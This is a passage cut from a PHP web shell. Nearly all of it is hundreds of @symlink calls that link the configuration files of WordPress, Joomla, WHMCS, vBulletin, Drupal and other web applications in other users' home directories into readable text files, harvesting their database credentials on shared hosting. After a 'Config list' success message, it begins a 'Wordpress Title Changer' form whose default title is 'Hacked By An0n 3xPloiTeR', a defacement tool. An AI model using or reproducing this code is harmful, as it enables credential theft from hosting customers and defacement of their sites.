@symlink('/home2/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
@symlink('/home2/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
@symlink('/home2/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/db.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/conect_to_mysql.php', $user . '-autobuy');
@symlink('/home2/' . $user . '/public_html/connect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/admin/connect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/include/connect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/wp-admin/connect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/wp-admin/config.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/wp-admin/dbconnect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/admin/dbconnect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/dbconnect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/admin/connection.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
@symlink('/home3/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
@symlink('/home3/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
@symlink('/home3/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
@symlink('/home3/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
@symlink('/home3/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
@symlink('/home3/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
@symlink('/home3/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
@symlink('/home3/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
@symlink('/home3/' . $user . '/public_html/library/config.php', $user . '-symlink');
@symlink('/home3/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
@symlink('/home3/' . $user . '/public_html/config.php', $user . '-4images1.txt');
@symlink('/home3/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
@symlink('/home3/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
@symlink('/home3/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
@symlink('/home3/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
@symlink('/home3/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
@symlink('/home3/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
@symlink('/home3/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
@symlink('/home3/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
@symlink('/home3/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
@symlink('/home3/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
@symlink('/home3/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
@symlink('/home3/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home3/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home3/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
@symlink('/home3/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
@symlink('/home3/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
@symlink('/home3/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
@symlink('/home3/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
@symlink('/home3/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
@symlink('/home3/' . $user . '/public_html/home3/wp-config.php', $user . '-wp-home3.txt');
@symlink('/home3/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
@symlink('/home3/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
@symlink('/home3/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
@symlink('/home3/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
@symlink('/home3/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home3/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home3/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
@symlink('/home3/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
@symlink('/home3/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
@symlink('/home3/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
@symlink('/home3/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
@symlink('/home3/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
@symlink('/home3/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
@symlink('/home3/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
@symlink('/home3/' . $user . '/public_html/home3/configuration.php', $user . '-joomla-home3.txt');
@symlink('/home3/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
@symlink('/home3/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
@symlink('/home3/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
@symlink('/home3/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
@symlink('/home3/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
@symlink('/home3/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
@symlink('/home3/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
@symlink('/home3/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
@symlink('/home3/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
@symlink('/home3/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
@symlink('/home3/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
@symlink('/home3/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
@symlink('/home3/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
@symlink('/home3/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
@symlink('/home3/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
@symlink('/home3/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
@symlink('/home3/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
@symlink('/home3/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
@symlink('/home3/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
@symlink('/home3/' . $user . '/public_html/include/db.php', $user . '-7.txt');
@symlink('/home3/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
@symlink('/home3/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
@symlink('/home3/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
@symlink('/home3/' . $user . '/public_html/config.php', $user . '-4images.txt');
@symlink('/home3/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home3/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
@symlink('/home3/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
@symlink('/home3/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
@symlink('/home3/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
@symlink('/home3/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
@symlink('/home3/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
@symlink('/home3/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
@symlink('/home3/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
@symlink('/home3/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
@symlink('/home3/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
@symlink('/home3/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
@symlink('/home3/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
@symlink('/home3/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
@symlink('/home3/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
@symlink('/home3/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
@symlink('/home3/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/db.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/conect_to_mysql.php', $user . '-autobuy');
@symlink('/home3/' . $user . '/public_html/connect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/admin/connect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/include/connect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/wp-admin/connect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/wp-admin/config.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/wp-admin/dbconnect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/admin/dbconnect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/dbconnect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/admin/connection.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
@symlink('/home4/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
@symlink('/home4/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
@symlink('/home4/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
@symlink('/home4/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
@symlink('/home4/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
@symlink('/home4/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
@symlink('/home4/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
@symlink('/home4/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
@symlink('/home4/' . $user . '/public_html/library/config.php', $user . '-symlink');
@symlink('/home4/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
@symlink('/home4/' . $user . '/public_html/config.php', $user . '-4images1.txt');
@symlink('/home4/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
@symlink('/home4/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
@symlink('/home4/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
@symlink('/home4/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
@symlink('/home4/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
@symlink('/home4/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
@symlink('/home4/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
@symlink('/home4/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
@symlink('/home4/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
@symlink('/home4/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
@symlink('/home4/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
@symlink('/home4/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home4/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home4/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
@symlink('/home4/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
@symlink('/home4/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
@symlink('/home4/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
@symlink('/home4/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
@symlink('/home4/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
@symlink('/home4/' . $user . '/public_html/home4/wp-config.php', $user . '-wp-home4.txt');
@symlink('/home4/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
@symlink('/home4/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
@symlink('/home4/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
@symlink('/home4/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
@symlink('/home4/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home4/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home4/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
@symlink('/home4/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
@symlink('/home4/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
@symlink('/home4/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
@symlink('/home4/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
@symlink('/home4/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
@symlink('/home4/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
@symlink('/home4/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
@symlink('/home4/' . $user . '/public_html/home4/configuration.php', $user . '-joomla-home4.txt');
@symlink('/home4/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
@symlink('/home4/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
@symlink('/home4/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
@symlink('/home4/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
@symlink('/home4/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
@symlink('/home4/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
@symlink('/home4/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
@symlink('/home4/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
@symlink('/home4/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
@symlink('/home4/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
@symlink('/home4/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
@symlink('/home4/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
@symlink('/home4/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
@symlink('/home4/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
@symlink('/home4/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
@symlink('/home4/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
@symlink('/home4/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
@symlink('/home4/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
@symlink('/home4/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
@symlink('/home4/' . $user . '/public_html/include/db.php', $user . '-7.txt');
@symlink('/home4/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
@symlink('/home4/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
@symlink('/home4/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
@symlink('/home4/' . $user . '/public_html/config.php', $user . '-4images.txt');
@symlink('/home4/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home4/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
@symlink('/home4/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
@symlink('/home4/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
@symlink('/home4/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
@symlink('/home4/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
@symlink('/home4/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
@symlink('/home4/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
@symlink('/home4/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
@symlink('/home4/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
@symlink('/home4/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
@symlink('/home4/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
@symlink('/home4/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
@symlink('/home4/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
@symlink('/home4/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
@symlink('/home4/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
@symlink('/home4/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/db.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/conect_to_mysql.php', $user . '-autobuy');
@symlink('/home4/' . $user . '/public_html/connect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/admin/connect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/include/connect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/wp-admin/connect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/wp-admin/config.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/wp-admin/dbconnect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/admin/dbconnect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/dbconnect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/admin/connection.php', $user . '-normal');
    }
    echo '<b class="cone"><br><br><center><font face="Tahoma" color="LawnGreen" size="2pt"><b>Congratulation ==>> </b> <a target="_blank" href="UeXploiT"><font color="LawnGreen" size="2pt">Config list</a></font></b>';
} }
			}
		?>
		<?php
			if (isset($_GET['wp_title'])) {
				$dir = getcwd();
					function ambilKata($param, $kata1, $kata2){
					    if(strpos($param, $kata1) === FALSE) return FALSE;
					    if(strpos($param, $kata2) === FALSE) return FALSE;
					    $start = strpos($param, $kata1) + strlen($kata1);
					    $end = strpos($param, $kata2, $start);
					    $return = substr($param, $start, $end - $start);
					    return $return;
					}
					echo "<center>
					<h1 class=def style='font-size:180%; color: lawngreen;'>Wordpress Title Changer</h1>
					<form method='post'>
					<span class=def>Config Dir: 
					<input type='text' size='50' style='width: 450px;' name='config_dir' value='$dir'><br><br>
					<span class=def>Title:
					<input type='text' name='new_title' style='width: 300px;' value='Hacked By An0n 3xPloiTeR' placeholder='New Title'><br><br>
					<input type='submit' name='hajar' value='Start' style='width: 300px;'><br>
					</form><br>";
						if($_POST['hajar']) {
